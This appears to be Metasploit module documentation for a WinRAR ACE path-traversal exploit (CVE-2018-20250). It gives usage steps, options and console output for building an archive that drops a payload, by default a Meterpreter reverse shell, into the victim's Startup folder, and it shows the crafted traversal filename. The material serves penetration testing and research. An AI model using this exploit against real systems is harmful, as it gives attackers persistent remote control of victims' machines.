## Introduction

**From the CVE-2018-20250 NVD Page**:
In WinRAR versions prior to and including 5.61, there is a path traversal vulnerability when crafting the filename field of the ACE format (in UNACEV2.dll). When the filename field is manipulated with specific patterns, the destination (extraction) folder is ignored, thus treating the filename as an absolute path.

This module will attempt to extract a payload to the startup folder of the current user. It is limited such that we can only go back one folder. Therefore, for this exploit to work properly, the user must extract the supplied RAR file from one folder within the user profile folder (e.g. Desktop or Downloads).

## Vulnerable Applications

- RARLAB WinRAR <= 5.61

## Verification Steps

1. Start msfconsole
2. Do: `use exploit/windows/fileformat/winrar_ace`
3. Do: `set FILENAME [FILENAME]`. Name is `msf.ace` by default.
4. Optional: Do: `set CUSTFILE [CUSTFILE]` to use a custom payload.
5. Optional: Do: `set PAYLOAD [PAYLOAD]`. `windows/meterpreter/reverse_tcp` by default. Skip if using a custom payload.
6. Configure your payload if using a Metasploit-provided payload. Skip if using a custom payload.
7. Do: `exploit`
8. **Verify** that a file is created (by default in `~/.msf4/local/`) and that it passes `**acefile.py**`'s checks

## Options

**FILENAME**
Filename to output. Default is `msf.ace`

**CUSTFILE**
Optional. Custom payload to use. Can be anything. Just be aware that some files are not *meant* to be executed in case you're wondering why the shellz ain't poppin'.

## Example

### Test with autogenerated payload, default options
```
msf5 exploit(windows/fileformat/winrar_ace) > set VERBOSE true
VERBOSE => true
msf5 exploit(windows/fileformat/winrar_ace) > set LHOST 172.16.79.1
LHOST => 172.16.79.1
msf5 exploit(windows/fileformat/winrar_ace) > exploit

[*] ACE header CRC16: 0x286b
[*] Filename: YqJotG.exe
[*] Payload CRC32: 0x890ed96f
[*] File header CRC16: 0x55e7
[+] msf.ace stored at /home/msfdev2/.msf4/local/msf.ace
msf5 exploit(windows/fileformat/winrar_ace) > 
```

Verify checksums using `acefile`:
```
msfdev2@automata:~$ python3 acefile.py --headers .msf4/local/msf.ace -v
warning: acebitstream c extension unavailable, using pure-python bit stream
processing archive .msf4/local/msf.ace
loaded 1 volume(s) starting at volume 0
archive is not locked, not multi-volume, solid
last modified 2019-02-22 03:00:32
created on Win32 with ACE 2.0 for extraction with 2.0+
advert [*UNREGISTERED VERSION*]
volume
    filename    .msf4/local/msf.ace
    filesize    73972
    headers     MAIN:1 FILE:1 others:0
header
    hdr_crc     0x286b
    hdr_size    49
    hdr_type    0x00        MAIN
    hdr_flags   0x9000      ADVERT|SOLID
    magic       b'**ACE**'
    eversion    20          2.0
    cversion    20          2.0
    host        0x02        Win32
    volume      0
    datetime    0x4e561810  2019-02-22 03:00:32
    reserved1   97 4f f6 aa 00 00 00 00
    advert      b'*UNREGISTERED VERSION*'
    comment     b''
    reserved2   b''
header
    hdr_crc     0x55e7
    hdr_size    113
    hdr_type    0x01        FILE32
    hdr_flags   0x8001      ADDSIZE|SOLID
    packsize    73802
    origsize    73802
    datetime    0x4e55b063  2019-02-21 22:03:06
    attribs     0x20000000  536870912
    crc32       0x890ed96f
    comptype    0x00        stored
    compqual    0x03        normal
    params      0x000a
    reserved1   0x4554
    filename    b'C:\\C:C:../AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\YqJotG.exe'
    comment     b''
    ntsecurity  b''
    reserved2   b''
msfdev2@automata:~$ 
```
### Test using a custom payload and saving to a different filename
```
msf5 exploit(windows/fileformat/winrar_ace) > set VERBOSE true
VERBOSE => true
msf5 exploit(windows/fileformat/winrar_ace) > set CUSTFILE /home/msfdev2/asdfasdf.txt
CUSTFILE => /home/msfdev2/asdfasdf.txt
msf5 exploit(windows/fileformat/winrar_ace) > set FILENAME custom.ace
FILENAME => custom.ace
msf5 exploit(windows/fileformat/winrar_ace) > exploit

[*] ACE header CRC16: 0x286b
[*] Using a custom payload: /home/msfdev2/asdfasdf.txt
[*] Filename: asdfasdf.txt
[*] Payload CRC32: 0x90117b38
[*] File header CRC16: 0x2cdd
[+] custom.ace stored at /home/msfdev2/.msf4/local/custom.ace
msf5 exploit(windows/fileformat/winrar_ace) > 
```

Payload is named `asdfasdf.txt` and contains `asdfasdf`. Verify checksums using `acefile`:

```
msfdev2@automata:~$ python3 acefile.py --headers .msf4/local/custom.ace -v
warning: acebitstream c extension unavailable, using pure-python bit stream
processing archive .msf4/local/custom.ace
loaded 1 volume(s) starting at volume 0
archive is not locked, not multi-volume, solid
last modified 2019-02-22 03:00:32
created on Win32 with ACE 2.0 for extraction with 2.0+
advert [*UNREGISTERED VERSION*]
volume
    filename    .msf4/local/custom.ace
    filesize    181
    headers     MAIN:1 FILE:1 others:0
header
    hdr_crc     0x286b
    hdr_size    49
    hdr_type    0x00        MAIN
    hdr_flags   0x9000      ADVERT|SOLID
    magic       b'**ACE**'
    eversion    20          2.0
    cversion    20          2.0
    host        0x02        Win32
    volume      0
    datetime    0x4e561810  2019-02-22 03:00:32
    reserved1   97 4f f6 aa 00 00 00 00
    advert      b'*UNREGISTERED VERSION*'
    comment     b''
    reserved2   b''
header
    hdr_crc     0x2cdd
    hdr_size    115
    hdr_type    0x01        FILE32
    hdr_flags   0x8001      ADDSIZE|SOLID
    packsize    9
    origsize    9
    datetime    0x4e55b063  2019-02-21 22:03:06
    attribs     0x20000000  536870912
    crc32       0x90117b38
    comptype    0x00        stored
    compqual    0x03        normal
    params      0x000a
    reserved1   0x4554
    filename    b'C:\\C:C:../AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\asdfasdf.txt'
    comment     b''
    ntsecurity  b''
    reserved2   b''
msfdev2@automata:~$ 
```